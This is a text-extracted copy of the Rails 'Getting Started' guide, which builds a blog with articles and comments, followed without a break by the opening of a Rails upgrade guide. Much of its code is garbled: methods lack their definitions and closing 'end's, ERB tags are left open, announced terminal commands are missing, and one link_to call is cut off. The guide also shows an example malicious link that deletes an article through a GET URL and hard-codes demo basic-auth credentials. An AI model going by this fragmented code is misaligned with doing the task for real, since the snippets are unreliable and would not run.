If you open up the newly generated `app/controllers/articles_controller.rb`<n>you'll see a fairly empty controller:
class ArticlesController < ApplicationController
A controller is simply a class that is defined to inherit from<n>`ApplicationController`.<n>
It's inside this class that you'll define methods that will become the actions<n>for this controller. 
These actions will perform CRUD operations on the articles<n>within our system.
NOTE: There are `public`, `private` and `protected` methods in Ruby,<n>but only `public` methods can be actions for controllers.<n>
For more details check out [Programming Ruby](http://www.ruby-doc.org/docs/ProgrammingRuby/).
If you refresh <http://localhost:3000/articles/new> now, you'll get a new error:
Unknown action new for ArticlesController!](
This error indicates that Rails cannot find the `new` action inside the<n>`ArticlesController` that you just generated. 
This is because when controllers<n>are generated in Rails they are empty by default, unless you tell it<n>your wanted actions during the generation process.
To manually define an action inside a controller, all you need to do is to<n>define a new method inside the controller. 
  def new
With the `new` method defined in `ArticlesController`, if you refresh<n><http://localhost:3000/articles/new> you'll see another error:
You're getting this error now because Rails expects plain actions like this one<n>to have views associated with them to display their information. 
With no view<n>available, Rails errors out.
In the above image, the bottom line has been truncated. 
Let's see what the full<n>thing looks like:
Missing template articles/new, application/new with {locale:[:en], formats:[:html], handlers:[:erb, :builder, :coffee]}. 
Searched in: * "/path/to/blog/app/views"
That's quite a lot of text! 
Let's quickly go through and understand what each<n>part of it does.
The first part identifies what template is missing. 
In this case, it's the<n>`articles/new` template. 
Rails will first look for this template. 
If not found,<n>then it will attempt to load a template called `application/new`. 
It looks for<n>one here because the `ArticlesController` inherits from `ApplicationController`.
The next part of the message contains a hash. 
The `:locale` key in this hash<n>simply indicates what spoken language template should be retrieved. 
By default,<n>this is the English - or "en" - template. 
The next key, `:formats` specifies the<n>format of template to be served in response. 
The default format is `:html`, and<n>so Rails is looking for an HTML template. 
The final key, `:handlers`, is telling<n>us what _template handlers_ could be used to render our template. `:erb` is most<n>commonly used for HTML templates, `:builder` is used for XML templates, and<n>`:coffee` uses CoffeeScript to build JavaScript templates.
The final part of this message tells us where Rails has looked for the templates.<n>
Templates within a basic Rails application like this are kept in a single<n>location, but in more complex applications it could be many different paths.
The simplest template that would work in this case would be one located at<n>`app/views/articles/new.html.erb`. 
The extension of this file name is key: the<n>first extension is the _format_ of the template, and the second extension is the<n>_handler_ that will be used. 
Rails is attempting to find a template called<n>`articles/new` within `app/views` for the application. 
The format for this<n>template can only be `html` and the handler must be one of `erb`, `builder` or<n>`coffee`. 
Because you want to create a new HTML form, you will be using the `ERB`<n>language. 
Therefore the file should be called `articles/new.html.erb` and needs<n>to be located inside the `app/views` directory of the application.
Go ahead now and create a new file at `app/views/articles/new.html.erb` and<n>write this content in it:
<h1>New Article</h1>
When you refresh <http://localhost:3000/articles/new> you'll now see that the<n>page has a title. 
The route, controller, action and view are now working<n>harmoniously! 
It's time to create the form for a new article.
### The first form
The primary form builder for Rails is provided by a helper<n>method called `form_for`. 
To use this method, add this code into<n>`app/views/articles/new.html.erb`:
<%= form_for :article do |f| %>
    <%= f.label :title %><br>
    <%= f.text_field :title %>
    <%= f.submit %>
If you refresh the page now, you'll see the exact same form as in the example.<n>
Building forms in Rails is really just that easy!
When you call `form_for`, you pass it an identifying object for this<n>form. 
In this case, it's the symbol `:article`. 
This tells the `form_for`<n>helper what this form is for. 
Inside the block for this method, the<n>`FormBuilder` object - represented by `f` - is used to build two labels and two<n>text fields, one each for the title and text of an article. 
Finally, a call to<n>`submit` on the `f` object will create a submit button for the form.
There's one problem with this form though. 
If you inspect the HTML that is<n>generated, by viewing the source of the page, you will see that the `action`<n>attribute for the form is pointing at `/articles/new`. 
This is a problem because<n>this route goes to the very page that you're on right at the moment, and that<n>route should only be used to display the form for a new article.
The form needs to use a different URL in order to go somewhere else.<n>
This can be done quite simply with the `:url` option of `form_for`.<n>
Typically in Rails, the action that is used for new form submissions<n>like this is called "create", and so the form should be pointed to that action.
Edit the `form_for` line inside `app/views/articles/new.html.erb` to look like<n>this:
<%= form_for :article, url: articles_path do |f| %>
In this example, the `articles_path` helper is passed to the `:url` option.
With the form and its associated route defined, you will be able to fill in the<n>form and then click the submit button to begin the process of creating a new<n>article, so go ahead and do that. 
When you submit the form, you should see a<n>familiar error:
You now need to create the `create` action within the `ArticlesController` for<n>this to work.
### Creating articles
If you re-submit the form now, you'll see another familiar error: a template is<n>missing. 
That's ok, we can ignore that for now. 
What the `create` action should<n>be doing is saving our new article to the database.
When a form is submitted, the fields of the form are sent to Rails as<n>_parameters_. 
These parameters can then be referenced inside the controller<n>actions, typically to perform a particular task. 
To see what these parameters<n>look like, change the `create` action to this:
  render plain: params[:article].inspect
The `render` method here is taking a very simple hash with a key of `plain` and<n>value of `params[:article].inspect`. 
The `params` method is the object which<n>represents the parameters (or fields) coming in from the form. 
The `params`<n>method returns an `ActiveSupport::HashWithIndifferentAccess` object, which<n>allows you to access the keys of the hash using either strings or symbols. 
In<n>this situation, the only parameters that matter are the ones from the form.
If you re-submit the form one more time you'll now no longer get the missing<n>template error. 
Instead, you'll see something that looks like the following:
{"title"=>"First article!", "text"=>"This is my first article."}
This action is now displaying the parameters for the article that are coming in<n>from the form. 
However, this isn't really all that helpful. 
Yes, you can see the<n>parameters but nothing in particular is being done with them.
### Creating the Article model
Models in Rails use a singular name, and their corresponding database tables<n>use a plural name. 
Rails provides a generator for creating models, which most<n>Rails developers tend to use when creating new models. 
To create the new model,<n>run this command in your terminal:
With that command we told Rails that we want a `Article` model, together<n>with a _title_ attribute of type string, and a _text_ attribute<n>of type text. 
Those attributes are automatically added to the `articles`<n>table in the database and mapped to the `Article` model.
Rails responded by creating a bunch of files. 
For now, we're only interested<n>in `app/models/article.rb` and `db/migrate/20140120191729_create_articles.rb`<n>(your name could be a bit different). 
The latter is responsible for creating<n>the database structure, which is what we'll look at next.
TIP: Active Record is smart enough to automatically map column names to model<n>attributes, which means you don't have to declare attributes inside Rails<n>models, as that will be done automatically by Active Record.
### Running a Migration
Migrations are Ruby classes that are<n>designed to make it simple to create and modify database tables. 
Rails uses<n>rake commands to run migrations, and it's possible to undo a migration after<n>it's been applied to your database. 
Migration filenames include a timestamp to<n>ensure that they're processed in the order that they were created.
If you look in the `db/migrate/20140120191729_create_articles.rb` file (remember,<n>yours will have a slightly different name), here's what you'll find:
class CreateArticles < ActiveRecord::Migration
    create_table :articles do |t|
      t.text :text
The above migration creates a method named `change` which will be called when<n>you run this migration. 
The action defined in this method is also reversible,<n>which means Rails knows how to reverse the change made by this migration,<n>in case you want to reverse it later. 
When you run this migration it will create<n>an `articles` table with one string column and a text column. 
It also creates<n>two timestamp fields to allow Rails to track article creation and update times.
At this point, you can use a rake command to run the migration:
Rails will execute this migration command and tell you it created the Articles<n>table.
==  CreateArticles: migrating ==================================================
-- create_table(:articles)
   -> 0.0019s
==  CreateArticles: migrated (0.0020s) =========================================
NOTE. Because you're working in the development environment by default, this<n>command will apply to the database defined in the `development` section of your<n>`config/database.yml` file. 
### Saving data in the controller
Back in `ArticlesController`, we need to change the `create` action<n>to use the new `Article` model to save the data in the database.<n>
Open `app/controllers/articles_controller.rb` and change the `create` action to<n>look like this:
  @article = Article.new(params[:article])
  @article.save
  redirect_to @article
Here's what's going on: every Rails model can be initialized with its<n>respective attributes, which are automatically mapped to the respective<n>database columns. 
In the first line we do just that (remember that<n>`params[:article]` contains the attributes we're interested in). 
Then,<n>`@article.save` is responsible for saving the model in the database. 
Finally,<n>we redirect the user to the `show` action, which we'll define later.
TIP: As we'll see later, `@article.save` returns a boolean indicating whether<n>the article was saved or not.
If you now go to <http://localhost:3000/articles/new> you'll *almost* be able<n>to create an article. 
Try it! 
You should get an error that looks like this:
Rails has several security features that help you write secure applications,<n>and you're running into one of them now. 
Why do you have to bother? 
The ability to grab and automatically assign all<n>controller parameters to your model in one shot makes the programmer's job<n>easier, but this convenience also allows malicious use. 
What if a request to<n>the server was crafted to look like a new article form submit but also included<n>extra fields with values that violated your applications integrity? 
They would<n>be 'mass assigned' into your model and then into the database along with the<n>good stuff - potentially breaking your application or worse.
We have to whitelist our controller parameters to prevent wrongful mass<n>assignment. 
In this case, we want to both allow and require the `title` and<n>`text` parameters for valid use of `create`. 
The syntax for this introduces<n>`require` and `permit`. 
  @article = Article.new(params.require(:article).permit(:title, :text))
This is often factored out into its own method so it can be reused by multiple<n>actions in the same controller, for example `create` and `update`. 
Above and<n>beyond mass assignment issues, the method is often made `private` to make sure<n>it can't be called outside its intended context.
Here is the result:
  @article = Article.new(article_params)
  def article_params
    params.require(:article).permit(:title, :text)
### Showing Articles
If you submit the form again now, Rails will complain about not finding the<n>`show` action. 
That's not very useful though, so let's add the `show` action<n>before proceeding.
article GET    /articles/:id(.:format)      articles#show
The special syntax `:id` tells rails that this route expects an `:id`<n>parameter, which in our case will be the id of the article.
As we did before, we need to add the `show` action in<n>`app/controllers/articles_controller.rb` and its respective view.
Given
def show
    @article = Article.find(params[:id])
A couple of things to note. 
We do this because Rails will pass all instance<n>variables to the view.
Now, create a new file `app/views/articles/show.html.erb` with the following<n>content:
  <strong>Title:</strong>
  <%= @article.title %>
  <strong>Text:</strong>
  <%= @article.text %>
With this change, you should finally be able to create new articles.
Visit <http://localhost:3000/articles/new> and give it a try!
Show action for articles](images/getting_started/show_action_for_articles.png)
### Listing all articles
We still need a way to list all our articles, so let's do that.
articles GET    /articles(.:format)          articles#index
    @articles = Article.all
<h1>Listing articles</h1>
<table>
  <tr>
    <th>Title</th>
    <th>Text</th>
  </tr>
  <% @articles.each do |article| %>
    <tr>
      <td><%= article.title %></td>
      <td><%= article.text %></td>
    </tr>
</table>
### Adding links
You can now create, show, and list articles. 
Now let's add some links to<n>navigate through pages.
Open `app/views/welcome/index.html.erb` and modify it as follows:
<%= link_to 'My Blog', controller: 'articles' %>
The `link_to` method is one of Rails' built-in view helpers. 
It creates a<n>hyperlink based on text to display and where to go - in this case, to the path<n>for articles.
Let's add links to the other views as well, starting with adding this<n>"New Article" link to `app/views/articles/index.html.erb`, placing it above the<n>`<table>` tag:
<%= link_to 'New article', new_article_path %>
This link will allow you to bring up the form that lets you create a new article.
<%= link_to 'Back', articles_path %>
TIP: If you want to link to an action in the same controller, you don't need to<n>specify the `:controller` option, as Rails will use the current controller by<n>default.
TIP: In development mode (which is what you're working in by default), Rails<n>reloads your application with every browser request, so there's no need to stop<n>and restart the web server when a change is made.
### Adding Some Validation
The model file, `app/models/article.rb` is about as simple as it can get:
There isn't much to this file - but note that the `Article` class inherits from<n>`ActiveRecord::Base`. 
Active Record supplies a great deal of functionality to<n>your Rails models for free, including basic database CRUD (Create, Read, Update,<n>Destroy) operations, data validation, as well as sophisticated search support<n>and the ability to relate multiple models to one another.
Rails includes methods to help you validate the data that you send to models.<n>
Open the `app/models/article.rb` file and edit it:
  validates :title, presence: true,
                    length: { minimum: 5 }
These changes will ensure that all articles have a title that is at least five<n>characters long. 
Rails can validate a variety of conditions in a model,<n>including the presence or uniqueness of columns, their format, and the<n>existence of associated objects. 
Validations are covered in detail in [Active<n>Record Validations](active_record_validations.html)
With the validation now in place, when you call `@article.save` on an invalid<n>article, it will return `false`. 
If you open<n>`app/controllers/articles_controller.rb` again, you'll notice that we don't<n>check the result of calling `@article.save` inside the `create` action.<n>
If `@article.save` fails in this situation, we need to show the form back to the<n>user. 
To do this, change the `new` and `create` actions inside<n>`app/controllers/articles_controller.rb` to these:
def new
  @article = Article.new
  if @article.save
    redirect_to @article
  else
    render 'new'
The `new` action is now creating a new instance variable called `@article`, and<n>you'll see why that is in just a few moments.
Notice that inside the `create` action we use `render` instead of `redirect_to`<n>when `save` returns `false`. 
The `render` method is used so that the `@article`<n>object is passed back to the `new` template when it is rendered. 
This rendering<n>is done within the same request as the form submission, whereas the<n>`redirect_to` will tell the browser to issue another request.
If you reload<n><http://localhost:3000/articles/new> and<n>try to save an article without a title, Rails will send you back to the<n>form, but that's not very useful. 
You need to tell the user that<n>something went wrong. 
To do that, you'll modify<n>`app/views/articles/new.html.erb` to check for error messages:
  <% if @article.errors.any? 
    <div id="error_explanation">
      <ul>
        <% @article.errors.full_messages.each do |msg| %>
          <li><%= msg %></li>
        <% end %>
      </ul>
    </div>
A few things are going on. 
We check if there are any errors with<n>`@article.errors.any?`, and in that case we show a list of all<n>errors with `@article.errors.full_messages`.
`pluralize` is a rails helper that takes a number and a string as its<n>arguments. 
The reason why we added `@article = Article.new` in the `ArticlesController` is<n>that otherwise `@article` would be `nil` in our view, and calling<n>`@article.errors.any?` would throw an error.
TIP: Rails automatically wraps fields that contain an error with a div<n>with class `field_with_errors`. 
You can define a css rule to make them<n>standout.
Form With Errors](images/getting_started/form_with_errors.png)
### Updating Articles
We've covered the "CR" part of CRUD. 
Now let's focus on the "U" part, updating<n>articles.
def edit
  @article = Article.find(params[:id])
The view will contain a form similar to the one we used when creating<n>new articles. 
Create a file called `app/views/articles/edit.html.erb` and make<n>it look as follows:
<h1>Editing article</h1>
<%= form_for :article, url: article_path(@article), method: :patch do |f| %>
This time we point the form to the `update` action, which is not defined yet<n>but will be very soon.
The `method: :patch` option tells Rails that we want this form to be submitted<n>via the `PATCH` HTTP method which is the HTTP method you're expected to use to<n>**update** resources according to the REST protocol.
The first parameter of `form_for` can be an object, say, `@article` which would<n>cause the helper to fill in the form with the fields of the object. 
Passing in a<n>symbol (`:article`) with the same name as the instance variable (`@article`)<n>also automagically leads to the same behavior. 
This is what is happening here.<n>
def update
  if @article.update(article_params)
    render 'edit'
The new method, `update`, is used when you want to update a record<n>that already exists, and it accepts a hash containing the attributes<n>that you want to update. 
As before, if there was an error updating the<n>article we want to show the form back to the user.
We reuse the `article_params` method that we defined earlier for the create<n>action.
TIP: You don't need to pass all attributes to `update`. 
For<n>example, if you'd call `@article.update(title: 'A new title')`<n>Rails would only update the `title` attribute, leaving all other<n>attributes untouched.
Finally, we want to show a link to the `edit` action in the list of all the<n>articles, so let's add that now to `app/views/articles/index.html.erb` to make<n>it appear next to the "Show" link:
    <th colspan="2"></th>
      <td><%= link_to 'Show', article_path(article) %></td>
      <td><%= link_to 'Edit', edit_article_path(article) %></td>
    </tr>
And we'll also add one to the `app/views/articles/show.html.erb` template as<n>well, so that there's also an "Edit" link on an article's page. 
Add this at the<n>bottom of the template:
And here's how our app looks so far:
Index action with edit link](images/getting_started/index_action_with_edit_link.png)
### Using partials to clean up duplication in views
TIP: You can read more about partials in the<n>[Layouts and Rendering in Rails](layouts_and_rendering.html) guide.
Create a new file `app/views/articles/_form.html.erb` with the following<n>content:
<%= form_for @article do |f| %>
Everything except for the `form_for` declaration remained the same.<n>
The reason we can use this shorter, simpler `form_for` declaration<n>to stand in for either of the other forms is that `@article` is a *resource*<n>corresponding to a full set of RESTful routes, and Rails is able to infer<n>which URI and method to use.
Now, let's update the `app/views/articles/new.html.erb` view to use this new<n>partial, rewriting it completely:
<h1>New article</h1>
<%= render 'form' %>
Then do the same for the `app/views/articles/edit.html.erb` view:
<h1>Edit article</h1>
### Deleting Articles
We're now ready to cover the "D" part of CRUD, deleting articles from the<n>database. 
DELETE /articles/:id(.:format)      articles#destroy
The `delete` routing method should be used for routes that destroy<n>resources. 
If this was left as a typical `get` route, it could be possible for<n>people to craft malicious URLs like this:
<a href='http://example.com/articles/1/destroy'>look at this cat!
def destroy
  @article.destroy
    @article = Article.new
    @article = Article.new(article_params)
    if @article.save
      redirect_to @article
    else
      render 'new'
    if @article.update(article_params)
      render 'edit'
  def destroy
    @article.destroy
    redirect_to articles_path
    def article_params
      params.require(:article).permit(:title, :text)
You can call `destroy` on Active Record objects when you want to delete<n>them from the database. 
Note that we don't need to add a view for this<n>action since we're redirecting to the `index` action.
Finally, add a 'Destroy' link to your `index` action template<n>(`app/views/articles/index.html.erb`) to wrap everything together.
<h1>Listing Articles</h1>
    <th colspan="3"></th>
      <td><%= link_to 'Destroy', article_path(article),
              method
} %></td>
Here we're using `link_to` in a different way. 
We pass the named route as the<n>second argument, and then the options as another argument. 
The `:method` and<n>`:'data-confirm'` options are used as HTML5 attributes so that when the link is<n>clicked, Rails will first show a confirm dialog to the user, and then submit the<n>link with method `delete`.  
This is done via the JavaScript file `jquery_ujs`<n>which is automatically included into your application's layout<n>(`app/views/layouts/application.html.erb`) when you generated the application.<n>
Without this file, the confirmation dialog box wouldn't appear.
Confirm Dialog](images/getting_started/confirm_dialog.png)
Congratulations, you can now create, show, list, update and destroy<n>articles.
For more information about routing, see<n>[Rails Routing from the Outside In](routing.html).
Adding a Second Model
It's time to add a second model to the application. 
The second model will handle<n>comments on articles.
### Generating a Model
We're going to see the same generator that we used before when creating<n>the `Article` model. 
This time we'll create a `Comment` model to hold<n>reference of article comments. 
Run this command in your terminal:
This command will generate four files:
| File                                         | Purpose                                                                                                |
| db/migrate/20140120201010_create_comments.rb | Migration to create the comments table in your database (your name will include a different timestamp) |
| app/models/comment.rb                        | The Comment model                                                                                      |
| test/models/comment_test.rb                  | Testing harness for the comments model                                                                 |
| test/fixtures/comments.yml                   | Sample comments for use in testing                                                                     |
First, take a look at `app/models/comment.rb`:
This is very similar to the `Article` model that you saw earlier. 
The difference<n>is the line `belongs_to :article`, which sets up an Active Record _association_.<n>
You'll learn a little about associations in the next section of this guide.
In addition to the model, Rails has also made a migration to create the<n>corresponding database table:
class CreateComments < ActiveRecord::Migration
    create_table :comments do |t|
      t.string :commenter
      t.text :body
      # this line adds an integer column called `article_id`.
      t.references :article, index: true
The `t.references` line sets up a foreign key column for the association between<n>the two models. 
An index for this association is also created on this column.<n>
Go ahead and run the migration:
Rails is smart enough to only execute the migrations that have not already been<n>run against the current database, so in this case you will just see:
==  CreateComments: migrating =================================================
-- create_table(:comments)
   -> 0.0115s
==  CreateComments: migrated (0.0119s) ========================================
### Associating Models
Active Record associations let you easily declare the relationship between two<n>models. 
In the case of comments and articles, you could write out the<n>relationships this way:
* Each comment belongs to one article.
* One article can have many comments.
In fact, this is very close to the syntax that Rails uses to declare this<n>association. 
You've already seen the line of code inside the `Comment` model<n>(app/models/comment.rb) that makes each comment belong to an Article:
You'll need to edit `app/models/article.rb` to add the other side of the<n>association:
These two declarations enable a good bit of automatic behavior. 
For example, if<n>you have an instance variable `@article` containing an article, you can retrieve<n>all the comments belonging to that article as an array using<n>`@article.comments`.
TIP: For more information on Active Record associations, see the [Active Record<n>Associations](association_basics.html) guide.
### Adding a Route for Comments
As with the `welcome` controller, we will need to add a route so that Rails<n>knows where we would like to navigate to see `comments`. 
Open up the<n>`config/routes.rb` file again, and edit it as follows:
This creates `comments` as a _nested resource_ within `articles`. 
This is<n>another part of capturing the hierarchical relationship that exists between<n>articles and comments.
TIP: For more information on routing, see the [Rails Routing](routing.html)<n>guide.
### Generating a Controller
With the model in hand, you can turn your attention to creating a matching<n>controller. 
Again, we'll use the same generator we used before:
| File/Directory                               | Purpose                                  |
----------------------------------------
| app/controllers/comments_controller.rb       | The Comments controller                  |
| app/views/comments/                          | Views of the controller are stored here  |
| test/controllers/comments_controller_test.rb | The test for the controller              |
| app/helpers/comments_helper.rb               | A view helper file                       |
| app/assets/javascripts/comment.js.coffee     | CoffeeScript for the controller          |
| app/assets/stylesheets/comment.css.scss      | Cascading style sheet for the controller |
Like with any blog, our readers will create their comments directly after<n>reading the article, and once they have added their comment, will be sent back<n>to the article show page to see their comment now listed. 
Due to this, our<n>`CommentsController` is there to provide a method to create comments and delete<n>spam comments when they arrive.
So first, we'll wire up the Article show template<n>(`app/views/articles/show.html.erb`) to let us make a new comment:
<h2>Add a comment:</h2>
<%= form_for([@article, @article.comments.build]) do |f| %>
    <%= f.label :commenter %><br>
    <%= f.text_field :commenter %>
    <%= f.label :body %><br>
    <%= f.text_area :body %>
This adds a form on the `Article` show page that creates a new comment by<n>calling the `CommentsController` `create` action. 
The `form_for` call here uses<n>an array, which will build a nested route, such as `/articles/1/comments`.
Let's wire up the `create` in `app/controllers/comments_controller.rb`:
class CommentsController < ApplicationController
    @article = Article.find(params[:article_id])
    @comment = @article.comments.create(comment_params)
    redirect_to article_path(@article)
    def comment_params
      params.require(:comment).permit(:commenter, :body)
You'll see a bit more complexity here than you did in the controller for<n>articles. 
That's a side-effect of the nesting that you've set up. 
Each request<n>for a comment has to keep track of the article to which the comment is attached,<n>thus the initial call to the `find` method of the `Article` model to get the<n>article in question.
In addition, the code takes advantage of some of the methods available for an<n>association. 
We use the `create` method on `@article.comments` to create and<n>save the comment. 
This will automatically link the comment so that it belongs to<n>that particular article.
Once we have made the new comment, we send the user back to the original article<n>using the `article_path(@article)` helper. 
As we have already seen, this calls<n>the `show` action of the `ArticlesController` which in turn renders the<n>`show.html.erb` template. 
This is where we want the comment to show, so let's<n>add that to the `app/views/articles/show.html.erb`.
<h2>Comments</h2>
<% @article.comments.each do |comment| %>
    <strong>Commenter:</strong>
    <%= comment.commenter %>
    <strong>Comment:</strong>
    <%= comment.body %>
Now you can add articles and comments to your blog and have them show up in the<n>right places.
Article with Comments](images/getting_started/article_with_comments.png)
Refactoring
Now that we have articles and comments working, take a look at the<n>`app/views/articles/show.html.erb` template. 
It is getting long and awkward. 
We<n>can use partials to clean it up.
### Rendering Partial Collections
First, we will make a comment partial to extract showing all the comments for<n>the article. 
  <strong>Commenter:</strong>
  <%= comment.commenter %>
  <strong>Comment:</strong>
  <%= comment.body %>
Then you can change `app/views/articles/show.html.erb` to look like the<n>following:
This will now render the partial in `app/views/comments/_comment.html.erb` once<n>for each comment that is in the `@article.comments` collection. 
As the `render`<n>method iterates over the `@article.comments` collection, it assigns each<n>comment to a local variable named the same as the partial, in this case<n>`comment` which is then available in the partial for us to show.
### Rendering a Partial Form
Let us also move that new comment section out to its own partial. 
Again, you<n>create a file `app/views/comments/_form.html.erb` containing:
Then you make the `app/views/articles/show.html.erb` look like the following:
The second render just defines the partial template we want to render,<n>`comments/form`. 
Rails is smart enough to spot the forward slash in that<n>string and realize that you want to render the `_form.html.erb` file in<n>the `app/views/comments` directory.
The `@article` object is available to any partials rendered in the view because<n>we defined it as an instance variable.
Deleting Comments
Another important feature of a blog is being able to delete spam comments. 
To do<n>this, we need to implement a link of some sort in the view and a `destroy`<n>action in the `CommentsController`.
So first, let's add the delete link in the<n>`app/views/comments/_comment.html.erb` partial:
  <%= link_to 'Destroy Comment', [comment.article, comment],
               method: :delete,
               data: { confirm: 'Are you sure?' 
Clicking this new "Destroy Comment" link will fire off a `DELETE<n>/articles/:article_id/comments/:id` to our `CommentsController`, which can then<n>use this to find the comment we want to delete, so let's add a `destroy` action<n>to our controller (`app/controllers/comments_controller.rb`):
    @comment = @article.comments.find(params[:id])
    @comment.destroy
The `destroy` action will find the article we are looking at, locate the comment<n>within the `@article.comments` collection, and then remove it from the<n>database and send us back to the show action for the article.
### Deleting Associated Objects
Rails allows<n>you to use the `dependent` option of an association to achieve this. 
Modify the<n>Article model, `app/models/article.rb`, as follows:
  has_many :comments, dependent: :destroy
### Basic Authentication
Rails provides a very simple HTTP authentication system that will work nicely in<n>this situation.
  http_basic_authenticate_with name: "dhh", password: "secret", except: [:index, :show]
We also want to allow only authenticated users to delete comments, so in the<n>`CommentsController` (`app/controllers/comments_controller.rb`) we write:
  http_basic_authenticate_with name: "dhh", password: "secret", only: :destroy
    # ...
Now if you try to create a new article, you will be greeted with a basic HTTP<n>Authentication challenge:
Basic HTTP Authentication Challenge](images/getting_started/challenge.png)
Other authentication methods are available for Rails applications. 
Two popular<n>authentication add-ons for Rails are the<n>[Devise](https://github.com/plataformatec/devise) rails engine and<n>the [Authlogic](https://github.com/binarylogic/authlogic) gem,<n>along with a number of others.
### Other Security Considerations
Security, especially in web applications, is a broad and detailed area. 
Security<n>in your Rails application is covered in more depth in<n>the [Ruby on Rails Security Guide](security.html)
What's Next?
Now that you've seen your first Rails application, you should feel free to<n>update it and experiment on your own. 
But you don't have to do everything<n>without help. 
As you need assistance getting up and running with Rails, feel<n>free to consult these support resources:
* The [Ruby on Rails Tutorial](http://railstutorial.org/book)
* The [Ruby on Rails mailing list](http://groups.google.com/group/rubyonrails-talk)
* The [#rubyonrails](irc://irc.freenode.net/#rubyonrails) channel on irc.freenode.net
Rails also comes with built-in help that you can generate using the rake<n>command-line utility:
* Running `rake doc:guides` will put a full copy of the Rails Guides in the<n>  `doc/guides` folder of your application. 
Open `doc/guides/index.html` in your<n>  web browser to explore the Guides.
* Running `rake doc:rails` will put a full copy of the API documentation for<n>  Rails in the `doc/api` folder of your application. 
Open `doc/api/index.html`<n>  in your web browser to explore the API documentation.
Add it to your `Gemfile` and run<n>`bundle install` and you're ready to go.
Configuration Gotchas
The easiest way to work with Rails is to store all external data as UTF-8. 
If<n>you don't, Ruby libraries and Rails will often be able to convert your native<n>data into UTF-8, but this doesn't always work reliably, so you're better off<n>ensuring that all external data is UTF-8.
If you have made a mistake in this area, the most common symptom is a black<n>diamond with a question mark inside appearing in the browser. 
Another common<n>symptom is characters like "Ã¼" appearing instead of "ü". 
Rails takes a number<n>of internal steps to mitigate common causes of these problems that can be<n>automatically detected and corrected. 
However, if you have external data that is<n>not stored as UTF-8, it can occasionally result in these kinds of issues that<n>cannot be automatically detected by Rails and corrected.
Two very common sources of data that are not UTF-8:
* Your text editor: Most text editors (such as TextMate), default to saving<n>  files as UTF-8. 
If your text editor does not, this can result in special<n>  characters that you enter in your templates (such as é) to appear as a diamond<n>  with a question mark inside in the browser. 
This also applies to your i18n<n>  translation files. 
Most editors that do not already default to UTF-8 (such as<n>  some versions of Dreamweaver) offer a way to change the default to UTF-8. 
Do<n>  so.
* Your database: Rails defaults to converting data from your database into UTF-8<n>  at the boundary. 
However, if your database is not using UTF-8 internally, it<n>  may not be able to store all characters that your users enter. 
For instance,<n>  if your database is using Latin-1 internally, and your user enters a Russian,<n>  Hebrew, or Japanese character, the data will be lost forever once it enters<n>  the database. 
If possible, use UTF-8 as the internal storage of your database.
A Guide for Upgrading Ruby on Rails
===================================
This guide provides steps to be followed when you upgrade your applications to a newer version of Ruby on Rails. 
These steps are also available in individual release guides.
General Advice
Before attempting to upgrade an existing application, you should be sure you have a good reason to upgrade. 
You need to balance several factors: the need for new features, the increasing difficulty of finding support for old code, and your available time and skills, to name a few.
### Test Coverage
The best way to be sure that your application still works after upgrading is to have good test coverage before you start the process. 
If you don't have automated tests that exercise the bulk of your application, you'll need to spend time manually exercising all the parts that have changed. 
In the case of a Rails upgrade, that will mean every single piece of functionality in the application. 
Do yourself a favor and make sure your test coverage is good _before_ you start an upgrade.
### Ruby Versions
Rails generally stays close to the latest released Ruby version when it's released:
* Rails 3 and above require Ruby 1.8.7 or higher. 
Support for all of the previous Ruby versions has been dropped officially. 
You should upgrade as early as possible.
* Rails 3.2.x is the last branch to support Ruby 1.8.7.
* Rails 4 prefers Ruby 2.0 and requires 1.9.3 or newer.
TIP: Ruby 1.8.7 p248 and p249 have marshaling bugs that crash Rails. 
Ruby Enterprise Edition has these fixed since the release of 1.8.7-2010.02. 
On the 1.9 front, Ruby 1.9.1 is not usable because it outright segfaults, so if you want to use 1.9.x, jump straight to 1.9.3 for smooth sailing.
### The Rake Task
Rails provides the `rails:update` rake task. 
After updating the Rails version<n>in the Gemfile, run this rake task.
This will help you with the creation of new files and changes of old files in an<n>interactive session.
$ rake rails:update
   identical  config/boot.rb
       exist  config
    conflict  config/routes.rb
Overwrite /myapp/config/routes.rb? 
(enter "h" for help) [Ynaqdh]
       force  config/routes.rb
    conflict  config/application.rb
Overwrite /myapp/config/application.rb? 
       force  config/application.rb
    conflict  config/environment.rb
Don't forget to review the difference, to see if there were any unexpected changes.
Upgrading from Rails 4.1 to Rails 4.2
### Web Console
First, add `gem 'web-console', '~> 2.0'` to the `:development` group in your Gemfile and run `bundle install` (it won't have been included when you upgraded Rails). 
Once it's been installed, you can simply drop a reference to the console helper (i.e., `<%= console %>`) into any view you want to enable it for. 
A console will also be provided on any error page you view in your development environment.
### Responders
`respond_with` and the class-level `respond_to` methods have been extracted to the `responders` gem. 
To use them, simply add `gem 'responders', '~> 2.0'` to your Gemfile. 
Calls to `respond_with` and `respond_to` (again, at the class level) will no longer work without having included the `responders` gem in your dependencies:
# app/controllers/users_controller.rb
  respond_to :html, :json
  def show
    @user = User.find(params[:id])
    respond_with @user
Instance-level `respond_to` is unaffected and does not require the additional gem:
      format.html
      format.json { render json: @user }
See [#16526](https://github.com/rails/rails/pull/16526) for more details.
### Error handling in transaction callbacks
Currently, Active Record suppresses errors raised<n>within `after_rollback` or `after_commit` callbacks and only prints them to<n>the logs. 
In the next version, these errors will no longer be suppressed.
Instead, the errors will propagate normally just like in other Active<n>Record callbacks.
When you define a `after_rollback` or `after_commit` callback, you<n>will receive a deprecation warning about this upcoming change. 
When<n>you are ready, you can opt into the new behavior and remove the<n>deprecation warning by adding following configuration to your<n>`config/application.rb`:
    config.active_record.raise_in_transactional_callbacks = true
See [#14488](https://github.com/rails/rails/pull/14488) and<n>[#16537](https://github.com/rails/rails/pull/16537) for more details.
### Ordering of test cases
In Rails 5.0, test cases will be executed in random order by default. 
In<n>anticipation of this change, Rails 4.2 introduced a new configuration option<n>`active_support.test_order` for explicitly specifying the test ordering. 
This<n>allows you to either lock down the current behavior by setting the option to<n>`:sorted`, or opt into the future behavior by setting the option to `:random`.
If you do not specify a value for this option, a deprecation warning will be<n>emitted. 
To avoid this, add the following line to your test environment:
# config/environments/test.rb
Rails.application.configure do
  config.active_support.test_order = :sorted # or `:random` if you prefer
### Serialized attributes
When using a custom coder (e.g. `serialize :metadata, JSON`),<n>assigning `nil` to a serialized attribute will save it to the database<n>as `NULL` instead of passing the `nil` value through the coder (e.g. `"null"`<n>when using the `JSON` coder).
### Production log level
In Rails 5, the default log level for the production environment will be changed<n>to `:debug` (from `:info`). 
To preserve the current default, add the following<n>line to your `production.rb`:
# Set to `:info` to match the current default, or set to `:debug` to opt-into
# the future default.
